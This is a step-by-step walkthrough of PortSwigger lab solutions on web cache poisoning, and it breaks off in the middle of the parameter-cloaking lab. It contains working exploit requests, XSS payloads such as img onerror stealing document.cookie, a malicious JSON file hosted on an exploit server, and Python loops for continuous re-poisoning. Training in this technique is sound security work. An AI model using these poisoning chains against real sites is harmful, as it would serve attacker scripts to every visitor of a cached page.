# Web Cache Poisoning - Complete PortSwigger Labs Guide

## Table of Contents

1. [Introduction to Web Cache Poisoning](#introduction-to-web-cache-poisoning)
2. [Core Concepts](#core-concepts)
3. [Lab Solutions - Exploiting Design Flaws](#lab-solutions-exploiting-design-flaws)
4. [Lab Solutions - Exploiting Implementation Flaws](#lab-solutions-exploiting-implementation-flaws)
5. [Attack Techniques](#attack-techniques)
6. [Real-World CVE Examples](#real-world-cve-examples)
7. [Tools and Automation](#tools-and-automation)
8. [Detection and Prevention](#detection-and-prevention)
9. [Resources and References](#resources-and-references)

---

## Introduction to Web Cache Poisoning

### What is Web Cache Poisoning?

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. The attack has two fundamental phases:

1. **Crafting a malicious response** from the backend server
2. **Ensuring that poisoned response gets cached** and distributed to victims

### Attack Impact

The damage potential depends on:
- **Payload severity**: XSS, JavaScript injection, open redirection
- **Traffic volume**: Whether the poisoned page receives significant visitor traffic

A cached poisoning attack on a homepage could affect thousands of users without any subsequent interaction from the attacker.

### How Web Caches Work

Caches sit between servers and users, storing responses to reduce server load. When requests arrive:
- Caches compare incoming requests against a **cache key** (typically request line and Host header)
- Request components excluded from the cache key are called **unkeyed inputs**
- Caches ignore unkeyed components when deciding whether to serve cached responses

### Attack Construction Process

1. **Identify unkeyed inputs**: Find request components the cache ignores (headers, parameters)
2. **Elicit harmful responses**: Manipulate unkeyed inputs to trigger dangerous backend responses
3. **Achieve caching**: Ensure the malicious response gets stored in cache

---

## Core Concepts

### Cache Keys vs Unkeyed Inputs

**Cache Key Components** (typically included):
- Request line (method, path, query string)
- Host header
- Sometimes specific headers (User-Agent, Accept-Language)

**Unkeyed Inputs** (typically excluded):
- X-Forwarded-Host
- X-Forwarded-Scheme
- X-Original-URL
- X-Rewrite-URL
- Cookies (in many implementations)
- UTM parameters
- Custom headers

### Cache Behavior Indicators

**HTTP Headers**:
```http
X-Cache: hit          # Response served from cache
X-Cache: miss         # Response came from backend
Age: 120              # Seconds since response was cached
Cache-Control: max-age=300    # Cache duration
```

### Cache Oracle

A **cache oracle** is a page or endpoint that provides feedback about cache behavior:
- Must be cacheable
- Must indicate whether you received a cached response or direct server response
- Useful for testing cache behavior without affecting real users

### Param Miner Tool

The **Param Miner** Burp extension automates unkeyed input discovery:
- Tests requests with extensive header lists
- Flags headers that produce response changes
- Adds cache-buster parameters to prevent accidental poisoning
- Available in Burp Suite BApp Store

---

## Lab Solutions - Exploiting Design Flaws

## Lab 1: Web Cache Poisoning with an Unkeyed Header

**Difficulty**: Apprentice
**Objective**: Poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser

### Vulnerability Description

The application processes the `X-Forwarded-Host` header unsafely, incorporating it into dynamically generated absolute URLs without treating it as a cache key.

### Step-by-Step Solution

**Step 1: Identify the Vulnerability**

1. Access the home page with Burp Proxy running
2. In HTTP history, find the home page request
3. Send the request to Repeater

**Step 2: Test for Cache Behavior**

1. Add a cache-buster parameter: `/?cb=1234`
2. Add the header: `X-Forwarded-Host: example.com`
3. Send the request
4. Observe that the header value appears in JavaScript URLs in the response

**Example Request**:
```http
GET /?cb=1234 HTTP/1.1
Host: ac1f1f8b1e9b8c0c80d71b8f008900b3.web-security-academy.net
X-Forwarded-Host: example.com
```

**Example Response**:
```html
<script type="text/javascript" src="//example.com/resources/js/tracking.js"></script>
```

**Step 3: Verify Caching**

1. Remove the cache-buster parameter
2. Send the same request multiple times
3. Look for `X-Cache: hit` in the response headers

**Step 4: Prepare Exploit Server**

1. Go to the exploit server
2. Create a file at: `/resources/js/tracking.js`
3. Add the payload: `alert(document.cookie)`
4. Save and note your exploit server ID

**Step 5: Poison the Cache**

1. In Repeater, modify the header:
   ```http
   X-Forwarded-Host: exploit-0a4a00c503b48c8480d61a5401b00024.exploit-server.net
   ```
2. Remove the cache-buster parameter
3. Send requests repeatedly until you see `X-Cache: hit`

**Step 6: Verify Exploitation**

1. Visit the home page in your browser
2. The alert should execute when the poisoned response is served
3. The cache expires every 30 seconds, so continuous re-poisoning may be necessary

### Key Takeaways

- **Unkeyed headers** can be used to inject malicious content
- **Cache-buster parameters** prevent accidental poisoning during testing
- **Timing is critical** - victims must access the page while poisoned content is cached
- **X-Cache headers** confirm whether responses are cached

### Burp Suite Features Used

- **Proxy HTTP History** - Request/response examination
- **Repeater** - Iterative request manipulation
- **Cache observation** - Monitoring X-Cache headers

### Common Mistakes

- Forgetting to remove cache-buster before final poisoning
- Not waiting for `X-Cache: hit` confirmation
- Incorrect exploit server path (must be `/resources/js/tracking.js`)

---

## Lab 2: Web Cache Poisoning with Multiple Headers

**Difficulty**: Practitioner
**Objective**: Poison the cache with a response that executes `alert(document.cookie)` by leveraging multiple headers

### Vulnerability Description

The application fails to properly handle multiple headers (`X-Forwarded-Host` and `X-Forwarded-Scheme`) when determining cache keys. When combined, these headers can redirect to attacker-controlled domains while remaining cached.

### Step-by-Step Solution

**Step 1: Initial Reconnaissance**

1. Load the home page with Burp running
2. Find the `/resources/js/tracking.js` request in HTTP history
3. Send to Repeater

**Step 2: Test Individual Headers**

1. Add cache-buster: `/?cb=1234`
2. Test `X-Forwarded-Host: example.com` alone
   - Result: No noticeable effect
3. Replace with `X-Forwarded-Scheme: nothttps`
   - Result: Triggers 302 redirect to HTTPS

**Example Request (X-Forwarded-Scheme only)**:
```http
GET /resources/js/tracking.js?cb=1234 HTTP/1.1
Host: ac1f1f091ff48c19807a1bcb00e400c3.web-security-academy.net
X-Forwarded-Scheme: nothttps
```

**Example Response**:
```http
HTTP/1.1 302 Found
Location: https://ac1f1f091ff48c19807a1bcb00e400c3.web-security-academy.net/resources/js/tracking.js?cb=1234
X-Cache: miss
```

**Step 3: Combine Headers**

1. Add both headers simultaneously:
   ```http
   X-Forwarded-Host: example.com
   X-Forwarded-Scheme: nothttps
   ```
2. Observe the `Location` header now redirects to: `https://example.com/`

**Combined Request**:
```http
GET /resources/js/tracking.js?cb=5678 HTTP/1.1
Host: ac1f1f091ff48c19807a1bcb00e400c3.web-security-academy.net
X-Forwarded-Host: example.com
X-Forwarded-Scheme: nothttps
```

**Response**:
```http
HTTP/1.1 302 Found
Location: https://example.com/resources/js/tracking.js?cb=5678
X-Cache: miss
```

**Step 4: Prepare Exploit Server**

1. Create file at: `/resources/js/tracking.js`
2. Insert payload: `alert(document.cookie)`

**Step 5: Poison Cache**

1. Set headers:
   ```http
   X-Forwarded-Host: exploit-0a8300c903f88c53802c1ba901a500e1.exploit-server.net
   X-Forwarded-Scheme: nothttps
   ```
2. Remove cache-buster
3. Repeat requests until `X-Cache: hit` appears

**Step 6: Verify and Trigger**

1. Test URL in browser to confirm cached malicious script
2. Reload home page to execute `alert()`

### Key Takeaways

- **Multiple headers** must be used together for vulnerability to manifest
- **Cache key normalization** doesn't strip both headers simultaneously
- **Header combination** creates more complex attack vectors
- **Keep re-poisoning** as cache entries expire

### HTTP Headers Explained

| Header | Purpose | Effect |
|--------|---------|--------|
| X-Forwarded-Host | Specifies destination hostname | Modifies redirect target |
| X-Forwarded-Scheme | Indicates original protocol | Triggers scheme validation |
| X-Cache | Cache hit/miss indicator | Confirms caching success |

### Burp Suite Features Used

- **HTTP History** - Traffic analysis
- **Repeater** - Iterative testing
- **Cache-buster parameters** - Query string manipulation
- **Browser integration** - Payload verification

---

## Lab 3: Web Cache Poisoning with an Unkeyed Cookie

**Difficulty**: Practitioner
**Objective**: Poison the cache with a response that executes `alert(1)` by leveraging an unkeyed cookie

### Vulnerability Description

The application fails to include cookies in cache key generation. The `fehost` cookie gets reflected in JavaScript without proper sanitization, allowing XSS attacks through cache poisoning.

### Step-by-Step Solution

**Step 1: Identify Cookie Reflection**

1. Load the homepage with Burp Proxy
2. Observe the `fehost=prod-cache-01` cookie in responses
3. Notice this value is reflected in JavaScript in the response body

**Example Response**:
```html
<script>
    data = {
        "host":"prod-cache-01",
        "path":"/",
    }
</script>
```

**Step 2: Confirm Reflection**

1. Send home page request to Repeater
2. Add cache-buster: `/?cb=9999`
3. Modify the cookie:
   ```http
   Cookie: session=xyz123; fehost=testvalue
   ```
4. Confirm "testvalue" appears in the response

**Step 3: Craft XSS Payload**

The cookie value is inserted into a JavaScript string context. Break out with:
```http
Cookie: session=xyz123; fehost=someString"-alert(1)-"someString
```

**Attack Flow**:
```javascript
// Original:
data = {"host":"prod-cache-01"}

// Injected:
data = {"host":"someString"-alert(1)-"someString"}

// Result: alert(1) executes
```

**Step 4: Test Payload**

**Request**:
```http
GET /?cb=8888 HTTP/1.1
Host: ac1f1ff41e0a8c0e80d51a72004500d0.web-security-academy.net
Cookie: session=xyz; fehost=abc"-alert(1)-"xyz
```

**Response** (check for reflected payload):
```html
<script>
    data = {
        "host":"abc"-alert(1)-"xyz",
    }
</script>
```

**Step 5: Cache Poisoning**

1. Remove cache-buster
2. Replay requests with malicious cookie
3. Wait for `X-Cache: hit`

**Final Request**:
```http
GET / HTTP/1.1
Host: ac1f1ff41e0a8c0e80d51a72004500d0.web-security-academy.net
Cookie: session=xyz; fehost=abc"-alert(1)-"xyz
```

**Step 6: Verify**

1. Visit homepage in browser
2. Alert executes from cached response

### Key Techniques

- **Burp Repeater** - Crafting requests with modified cookies
- **Cache oracle** - Using response headers to detect cache hits
- **DOM-based XSS** - Breaking out of JavaScript string context

### Common Mistakes

- Forgetting cache-buster during initial testing
- Not properly escaping quotes in JavaScript strings
- Not waiting for `X-Cache: hit` confirmation
- Testing with a different session cookie (sessions may not be cached)

### JavaScript Context Escaping

Understanding the injection context is crucial:

```javascript
// Context: JavaScript object value
data = {"host":"VALUE_HERE"}

// Break out techniques:
"};alert(1);//       // Close object, execute code, comment rest
"-alert(1)-"         // Arithmetic operators force execution
"+alert(1)+"         // Concatenation forces execution
"||alert(1)||"       // Logical OR forces execution
```

---

## Lab 4: Combining Web Cache Poisoning Vulnerabilities

**Difficulty**: Expert
**Objective**: Poison the cache with a response that executes `alert(document.cookie)` using a complex exploit chain

### Vulnerability Description

This advanced lab requires coordination of multiple vulnerabilities:
1. **Unkeyed headers**: `X-Forwarded-Host` and `X-Original-URL` not in cache keys
2. **DOM-based XSS**: `initTranslations()` function improperly processes JSON data
3. **Cache normalization**: Server normalizes backslashes to forward slashes

### Attack Overview

The target user:
- Visits the home page once per minute
- Has English language settings

The attack must:
1. Force English user to Spanish language page
2. Load malicious translations JSON
3. Trigger XSS through translated content

### Step-by-Step Solution

**Step 1: Analyze the Application**

1. Browse the site and identify:
   - Language switcher functionality
   - Translation JSON loading
   - Product pages with translatable content

2. Use Param Miner to discover:
   - `X-Forwarded-Host` header support
   - `X-Original-URL` header support

**Step 2: Create Malicious Translations JSON**

On exploit server, create `/resources/json/translations.json`:

```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />"
        }
    }
}
```

**Important**: Add CORS header to allow cross-origin access:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

{JSON content}
```

**Step 3: Understand the Exploit Chain**

The attack requires three components working together:

```
1. User visits homepage (English)
     ↓
2. Cache poisoning redirects to setlang\es
     ↓
3. Spanish page loads with poisoned translations
     ↓
4. XSS executes through "View details" link
```

**Step 4: Poison the Localized Page**

First, poison the Spanish product page to load malicious JSON.

**Request to poison `/`** with `?localized=1`:
```http
GET /?localized=1&cb=1111 HTTP/1.1
Host: ac7b1f821e9f8cdb8020162300ad0045.web-security-academy.net
Cookie: session=xyz; lang=es
X-Forwarded-Host: exploit-0aae00d01e408c4b802e16c7011300a9.exploit-server.net
```

**Why this works**:
- `?localized=1` triggers translation loading
- `lang=es` cookie loads Spanish translations
- `X-Forwarded-Host` points to exploit server
- The page loads malicious JSON and caches the result

**Step 5: Poison the Language Redirection**

Now force English users to load the Spanish page using path normalization.

**Path Normalization Exploit**:
```
/setlang\es  →  /setlang/es  (normalized by cache)
```

The cache treats this as `/setlang/es` but the backend may handle it differently, creating a cacheable redirect.

**Request**:
```http
GET / HTTP/1.1
Host: ac7b1f821e9f8cdb8020162300ad0045.web-security-academy.net
X-Original-URL: /setlang\es
```

**Response**:
```http
HTTP/1.1 302 Found
Location: /?lang=es
Set-Cookie: lang=es
X-Cache: hit
```

**Step 6: Maintain Poisoned State**

Both poisoned responses must remain cached simultaneously:

1. Continuously resend both poisoning requests
2. Monitor cache status with `X-Cache` headers
3. Ensure both show `hit` when victim visits

**Timing Strategy**:
```bash
# Poison localized page every 25 seconds
# Poison redirect every 25 seconds
# Victim visits every 60 seconds
```

**Step 7: Verification**

When an English-language user visits:
1. They hit the poisoned cache at `/`
2. Get redirected to `/?lang=es`
3. Page loads with malicious translations
4. XSS executes through the "View details" link

### Attack Flow Diagram

```
English User Visit
       ↓
   [GET /]
       ↓
Cache Hit (Poisoned)
       ↓
   302 Redirect
   Location: /?lang=es
       ↓
Spanish Page Loads
       ↓
Fetch Translations
       ↓
X-Forwarded-Host: exploit-server
       ↓
Load Malicious JSON
       ↓
Render "View details" link
       ↓
<img src=1 onerror='alert(document.cookie)'>
       ↓
   XSS EXECUTES
```

### Key Concepts

**Cache Normalization**:
- Server normalizes `\` to `/` in paths
- Creates discrepancy between cache key and backend routing
- Allows creation of cacheable redirects

**Multi-Stage Poisoning**:
- Stage 1: Poison the target page content
- Stage 2: Poison the routing to that page
- Both must be cached simultaneously

**Language-Based Attacks**:
- Exploit translation functionality
- Inject XSS through translated strings
- Bypass input validation in JSON data

### Burp Suite Features Used

- **Param Miner** - Header discovery
- **Repeater** - Request manipulation and response analysis
- **HTTP History** - Traffic analysis
- **Cache monitoring** - X-Cache header observation

### Common Mistakes

- Not maintaining both poisoned caches simultaneously
- Incorrect JSON syntax in translations
- Missing CORS headers on exploit server
- Wrong path for translations JSON
- Not testing with correct language cookie

### Advanced Techniques

**Cache Busting During Development**:
```http
GET /?cb=TIMESTAMP HTTP/1.1
```

**Checking Cache Status**:
```bash
# Look for these headers:
X-Cache: hit        # Poisoning successful
X-Cache: miss       # Need to poison again
Age: 25             # Seconds cached (helps timing)
```

**Persistent Poisoning**:
```python
import requests
import time

while True:
    # Poison localized page
    requests.get(url1, headers=headers1)

    # Poison redirect
    requests.get(url2, headers=headers2)

    time.sleep(25)  # Re-poison before cache expires
```

---

## Lab 5: Web Cache Poisoning to Exploit a DOM Vulnerability via a Cache with Strict Cacheability Criteria

**Difficulty**: Expert
**Objective**: Poison the cache with a response that executes `alert(document.cookie)` when the target has strict caching criteria

### Vulnerability Description

The application has a DOM-based XSS vulnerability combined with web cache poisoning, but with strict caching rules:
- Responses with `Set-Cookie` headers are NOT cached
- Must use existing session cookie to achieve caching
- `X-Forwarded-Host` header overwrites `data.host` variable
- `initGeoLocate()` function processes JSON data unsafely

### Step-by-Step Solution

**Step 1: Reconnaissance**

1. Monitor HTTP history to identify home page request
2. Use Param Miner to discover supported headers
3. Identify that `X-Forwarded-Host` header is supported

**Using Param Miner**:
- Right-click on request → Extensions → Param Miner → "Guess headers"
- Param Miner will test various headers and flag interesting ones

**Step 2: Analyze the Vulnerability**

Examine the page source for geolocation functionality:

```javascript
<script>
    initGeoLocate('/resources/json/geolocate.json');
</script>

<script>
function initGeoLocate(jsonUrl) {
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');
            geoLocateContent.innerHTML = 'Free shipping to ' + j.country;
        });
}
</script>
```

**Vulnerability**: The `innerHTML` assignment with unsanitized JSON data creates an XSS vector.

**Step 3: Test X-Forwarded-Host Impact**

**Request**:
```http
GET /?cb=1234 HTTP/1.1
Host: ac1f1f7e1e338c7b80c81b0e00c800fa.web-security-academy.net
X-Forwarded-Host: example.com
Cookie: session=existingSessionValue
```

**Response** (check script tag):
```html
<script>
    initGeoLocate('//example.com/resources/json/geolocate.json');
</script>
```

The header successfully modifies the JSON URL!

**Step 4: Create Malicious Geolocation JSON**

On exploit server, create `/resources/json/geolocate.json`:

```json
{
    "country": "<img src=1 onerror=alert(document.cookie) />"
}
```

**Important**: Add CORS header:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

{"country": "<img src=1 onerror=alert(document.cookie) />"}
```

**Step 5: Understand Caching Restriction**

**Problem**: Responses with `Set-Cookie` are not cached.

**Solution**: Use an existing session cookie instead of letting the server set a new one.

**Wrong approach** (won't cache):
```http
GET / HTTP/1.1
Host: victim.net
X-Forwarded-Host: exploit-server.net
# No Cookie header - server sets new session - response not cached!
```

**Correct approach** (will cache):
```http
GET / HTTP/1.1
Host: victim.net
X-Forwarded-Host: exploit-server.net
Cookie: session=existingValue
# Using existing session - no Set-Cookie in response - caches successfully!
```

**Step 6: Poison the Cache**

1. First, visit the home page normally to get a session cookie
2. Copy the session value from your browser
3. Use that session in poisoning requests

**Poisoning Request**:
```http
GET / HTTP/1.1
Host: ac1f1f7e1e338c7b80c81b0e00c800fa.web-security-academy.net
X-Forwarded-Host: exploit-0ad800f21e598c3f80ec1a6d01c900e7.exploit-server.net
Cookie: session=CopiedSessionValueHere
```

**Response to watch for**:
```http
HTTP/1.1 200 OK
X-Cache: miss    # First time
# No Set-Cookie header!

<script>
    initGeoLocate('//exploit-0ad800f21e598c3f80ec1a6d01c900e7.exploit-server.net/resources/json/geolocate.json');
</script>
```

4. Send request multiple times
5. Watch for `X-Cache: hit` indicating successful caching

**Step 7: Verify Exploitation**

1. In a fresh browser (or incognito), visit the home page
2. The page loads the malicious JSON
3. The XSS payload executes through `innerHTML`

**Execution Flow**:
```
Page loads
    ↓
Fetch //exploit-server/resources/json/geolocate.json
    ↓
Receive: {"country": "<img src=1 onerror=alert(document.cookie) />"}
    ↓
Execute: geoLocateContent.innerHTML = 'Free shipping to ' + j.country
    ↓
Result: innerHTML = 'Free shipping to <img src=1 onerror=alert(document.cookie) />'
    ↓
XSS EXECUTES via onerror event
```

### Key Concepts

**Strict Cacheability Criteria**:
- Some caches refuse to cache responses with certain headers
- `Set-Cookie` is commonly excluded from caching
- Must craft requests that avoid triggering new session creation

**Session Cookie Strategy**:
```
1. Get existing session → Cache accepts
2. No session cookie → Server sets new cookie → Cache rejects
```

**DOM-based XSS via innerHTML**:
- `innerHTML` parses and executes HTML
- JSON data flows into `innerHTML` without sanitization
- Image `onerror` events execute JavaScript

### Burp Suite Features

**Param Miner Configuration**:
1. Right-click request
2. Extensions → Param Miner → "Guess headers"
3. Review output tab for discovered headers

**Repeater Workflow**:
1. Add cache-buster for testing
2. Test with existing session cookie
3. Verify no `Set-Cookie` in response
4. Remove cache-buster for actual poisoning
5. Monitor `X-Cache` header

**HTTP History Analysis**:
- Identify existing session cookies
- Copy values for reuse in poisoning
- Monitor cache behavior across requests

### Common Mistakes

1. **Not using existing session cookie**
   - Result: `Set-Cookie` header added, response not cached
   - Fix: Copy session from legitimate request

2. **Forgetting CORS headers on exploit server**
   - Result: Browser blocks JSON loading
   - Fix: Add `Access-Control-Allow-Origin: *`

3. **Wrong JSON syntax**
   - Result: JavaScript error, XSS doesn't execute
   - Fix: Validate JSON format

4. **Cache-buster in final poisoning**
   - Result: Unique cache key, doesn't affect other users
   - Fix: Remove cache-buster for actual attack

### Advanced Techniques

**Identifying Cacheability Restrictions**:
```bash
# Test different scenarios:
curl -I https://target.com/                    # No session
curl -I https://target.com/ -H "Cookie: session=abc"  # With session

# Compare:
# Response 1: Has Set-Cookie → X-Cache: miss (always)
# Response 2: No Set-Cookie → X-Cache: hit (after cache)
```

**Testing DOM Sinks**:
```javascript
// Safe: textContent
element.textContent = data;  // HTML not parsed

// Unsafe: innerHTML
element.innerHTML = data;    // HTML parsed and executed!

// Common sinks:
- innerHTML
- outerHTML
- insertAdjacentHTML
- document.write
- eval()
```

**Cache Timing Analysis**:
```python
import requests
import time

# Send poisoning request
response1 = requests.get(url, headers=headers)
time1 = time.time()

# Wait and check if cached
time.sleep(5)
response2 = requests.get(url)

if 'X-Cache: hit' in response2.headers:
    print(f"Cached after {time.time() - time1} seconds")
```

---

## Lab Solutions - Exploiting Implementation Flaws

## Lab 6: Web Cache Poisoning via an Unkeyed Query Parameter

**Difficulty**: Practitioner
**Objective**: Poison the cache with a response that executes `alert(1)` via an unkeyed query parameter

### Vulnerability Description

The application excludes the `utm_content` parameter from cache key generation despite reflecting it in responses. This is common with UTM analytics parameters that developers often overlook during cache configuration.

### Step-by-Step Solution

**Step 1: Identify Cache Oracle**

The home page serves as a cache oracle:
1. Load home page: `GET /`
2. Add query string: `GET /?test=1`
3. Observe `X-Cache: miss` (query string included in cache key)

This tells us the query string IS part of the cache key by default.

**Step 2: Add Cache-Busting Parameter**

To safely test without affecting other users:
```http
GET /?cb=uniqueValue HTTP/1.1
Host: ac1f1f0e1e408c128093193800f800b3.web-security-academy.net
```

**Step 3: Discover Unkeyed Parameters with Param Miner**

1. Right-click request in Burp
2. Extensions → Param Miner → "Guess GET parameters"
3. Param Miner tests common parameter names
4. Review output for discovered parameters

**Param Miner Output**:
```
Testing parameter: utm_source    → No reflection
Testing parameter: utm_medium    → No reflection
Testing parameter: utm_content   → REFLECTED!
Testing parameter: utm_campaign  → No reflection
```

**Step 4: Confirm Unkeyed Status**

Test if `utm_content` affects caching:

**Request 1**:
```http
GET /?cb=123&utm_content=test1 HTTP/1.1
Host: ac1f1f0e1e408c128093193800f800b3.web-security-academy.net
```

**Request 2**:
```http
GET /?cb=123&utm_content=test2 HTTP/1.1
Host: ac1f1f0e1e408c128093193800f800b3.web-security-academy.net
```

**Observe**:
- Second request shows `X-Cache: hit`
- Even though `utm_content` values differ!
- This confirms `utm_content` is UNKEYED

**Cache Key Analysis**:
```
Cache Key = GET / + ?cb=123
            ↑        ↑
         Method    Query string (cb only)

NOT in cache key: utm_content parameter
```

**Step 5: Test Reflection**

Find where `utm_content` is reflected:

**Request**:
```http
GET /?cb=456&utm_content=testvalue HTTP/1.1
```

**Response** (search for "testvalue"):
```html
<link rel="canonical" href='//ac1f1f0e1e408c128093193800f800b3.web-security-academy.net/?utm_content=testvalue'/>
```

The parameter is reflected in the `canonical` link!

**Step 6: Craft XSS Payload**

Break out of the attribute context:

**Payload Analysis**:
```html
<!-- Original: -->
<link rel="canonical" href='//site.net/?utm_content=VALUE'/>

<!-- Injected: -->
utm_content='/><script>alert(1)</script>

<!-- Result: -->
<link rel="canonical" href='//site.net/?utm_content='/><script>alert(1)</script>'/>
                                                      ↑
                                                   Closes link tag
```

**Step 7: Test Payload**

**Request**:
```http
GET /?cb=789&utm_content='/><script>alert(1)</script> HTTP/1.1
Host: ac1f1f0e1e408c128093193800f800b3.web-security-academy.net
```

**Response**:
```html
<link rel="canonical" href='//ac1f1f0e1e408c128093193800f800b3.web-security-academy.net/?utm_content='/><script>alert(1)</script>'/>
```

Verify the script tag is properly formed!

**Step 8: Poison the Cache**

1. Remove cache-buster
2. Keep malicious `utm_content`

**Final Poisoning Request**:
```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: ac1f1f0e1e408c128093193800f800b3.web-security-academy.net
```

3. Send repeatedly until `X-Cache: hit`

**Step 9: Verify Exploitation**

Visit the clean URL in browser:
```
https://ac1f1f0e1e408c128093193800f800b3.web-security-academy.net/
```

The poisoned cache serves the response with XSS payload, and `alert(1)` executes!

### Key Concepts

**Unkeyed Query Parameters**:
- Some parameters excluded from cache keys for performance
- Common with analytics parameters (utm_*, ga_*, fb_*)
- Creates cache poisoning opportunity if reflected

**Cache Key vs Reflected Input**:
```
For successful cache poisoning:
1. Parameter must be UNKEYED (not in cache key)
   AND
2. Parameter must be REFLECTED (in response)
```

**UTM Parameters**:
- `utm_source` - Traffic source (e.g., google, newsletter)
- `utm_medium` - Marketing medium (e.g., cpc, banner, email)
- `utm_campaign` - Campaign name
- `utm_content` - Content variation (A/B testing)
- `utm_term` - Search keywords

Marketing teams want these parameters but they shouldn't affect caching!

### Burp Suite Features

**Param Miner - GET Parameter Discovery**:
```
1. Right-click request
2. Extensions → Param Miner → "Guess GET parameters"
3. Options:
   - Add cache-buster: ✓
   - Detect reflection: ✓
   - Detect cache key: ✓
```

**Repeater - Testing Workflow**:
```
1. Add cache-buster (?cb=RANDOM)
2. Test parameter reflection
3. Craft payload
4. Test with cache-buster
5. Remove cache-buster
6. Poison cache
7. Monitor X-Cache header
```

### Common Mistakes

1. **Testing without cache-buster**
   - Risk: Accidentally poison cache for real users
   - Fix: Always use `?cb=TIMESTAMP` during testing

2. **Assuming all query parameters are keyed**
   - Reality: Analytics parameters often excluded
   - Fix: Test each parameter individually

3. **Not verifying reflection point**
   - Problem: Parameter may be unkeyed but not reflected
   - Fix: Search response for parameter value

4. **Incorrect payload encoding**
   - Issue: Payload broken by URL encoding
   - Fix: Test URL encoding variations

### Advanced Techniques

**Systematic Parameter Discovery**:
```bash
# Common unkeyed parameters:
utm_source
utm_medium
utm_campaign
utm_content
utm_term
gclid
fbclid
_ga
tracking_id
affiliate_id
```

**Automated Testing Script**:
```python
import requests

params_to_test = ['utm_source', 'utm_medium', 'utm_content', 'gclid', 'fbclid']
base_url = "https://target.com/"

for param in params_to_test:
    # Test with unique value
    test_value = f"test_{param}"
    r1 = requests.get(f"{base_url}?cb=123&{param}={test_value}")

    # Check reflection
    if test_value in r1.text:
        print(f"[+] {param} is REFLECTED")

        # Test if unkeyed
        r2 = requests.get(f"{base_url}?cb=123&{param}=different")
        if 'X-Cache: hit' in r2.headers:
            print(f"[!] {param} is UNKEYED - VULNERABLE!")
```

**Context-Specific Payloads**:

For `href` attribute:
```
utm_content='/><script>alert(1)</script>
```

For HTML content:
```
utm_content=<script>alert(1)</script>
```

For JavaScript context:
```
utm_content=';alert(1);//
```

For URL parameter in JavaScript:
```
utm_content=&quot;);alert(1);//
```

---

## Lab 7: Parameter Cloaking

**Difficulty**: Expert
**Objective**: Use parameter cloaking technique to poison the cache with a response that executes `alert(1)`

### Vulnerability Description

The application demonstrates **parameter cloaking** - a technique where:
1. `utm_content` parameter is excluded from cache keys
2. **Inconsistent parameter parsing** between cache and backend
3. Using semicolons allows hiding malicious parameters within excluded parameters

### Core Concept: Parameter Cloaking

Different systems parse URL parameters differently:

**Standard parsing** (most systems):
```
/path?param1=value1&param2=value2&param3=value3
```

**Ruby on Rails parsing**:
```
/path?param1=value1;param2=value2
# Semicolon treated as parameter separator!
```

**Parameter Cloaking Attack**:
```
/path?utm_content=foo;callback=evil

Cache sees: utm_content=foo;callback=evil (one parameter)
Backend sees: utm_content=foo AND callback=evil (two parameters!)
```

### Step-by-Step Solution

**Step 1: Identify Unkeyed Parameter**

Use Param Miner to discover `utm_content` is unkeyed:

```http
GET /?cb=123&utm_content=test HTTP/1.1
Host: ac1f1f731ee58c15804f1beb00c00092.web-security-academy.net
```

Multiple requests with different `utm_content` values still show `X-Cache: hit`.

**Step 2: Discover Vulnerable Endpoint**

The application imports `/js/geolocate.js` on every page:

```html
<script src="/js/geolocate.js?callback=setCountryCookie"></script>
```

This JavaScript file executes a callback function.

**Step 3: Test Callback Parameter**

**Normal behavior**:
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
```

**Response**:
```javascript
setCountryCookie({"country":"United Kingdom"});
```

**Modified callback**:
```http
GET /js/geolocate.js?callback=myFunction HTTP/1.1
```

**Response**:
```javascript
myFunction({"country":"United Kingdom"});
```

The `callback` parameter controls the function name!

**Step 4: Attempt Direct Cache Poisoning**

Try poisoning with malicious callback:

```http
GET /js/geolocate.js?callback=alert HTTP/1.1
```

**Problem**: `X-Cache: miss` every time!

Why? Because `callback` IS part of the cache key. Changing it creates a different cache entry.

**Step 5: Apply Parameter Cloaking**

Hide the `callback` parameter inside `utm_content` using semicolon:

**Cloaked Request**:
```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=evil HTTP/1.1
Host: ac1f1f731ee58c15804f1beb00c00092.web-security-academy.net
```

**How the cache sees it**:
```
Cache Key = /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=evil
                                                        ↑
                                                   Ignored (unkeyed)

Effective cache key = /js/geolocate.js?callback=setCountryCookie
```

**How the backend sees it** (Ruby on Rails):
```
Parameters:
  callback = "setCountryCookie"  (first occurrence ignored)
  utm_content = "foo"
  callback = "evil"              (second occurrence WINS!)
```

**Step 6: Verify Parameter Cloaking**

Test with cache-buster:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=testFunction&cb=999 HTTP/1.1
```

**Response**:
```javascript
testFunction({"country":"United Kingdom"});
```

It works! The cloaked `callback` parameter is processed by the backend!

**Step 7: Craft XSS Payload**

The callback function name can be any JavaScript:

```http
utm_content=foo;callback=alert(1)
```

**Full URL**:
```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)&cb=111 HTTP/1.1
```

**Response**:
```javascript
alert(1)({"country":"United Kingdom"});
```

This executes `alert(1)` and tries to call the return value as a function.

**Step 8: Poison the Cache**

Remove cache-buster and poison:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/1.1
Host: ac1f1f731ee58c15804f1beb00c00092.web-security-academy.net
```

Send repeatedly until `X-Cache: hit`

**Step 9: Verify Exploitation**

1. Visit the homepage in a browser
2. The page loads `/js/geolocate.js?callback=setCountryCookie`
3. The poisoned cache serves the response with `alert(1)`
4. XSS executes!

### Attack Flow Diagram

```
Request: /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
                              ↓
                    ┌─────────┴─────────┐
                    ↓                   ↓
                 CACHE              BACKEND
                    ↓                   ↓
          Cache Key:                Parse:
          callback=setCountryCookie  callback=setCountryCookie
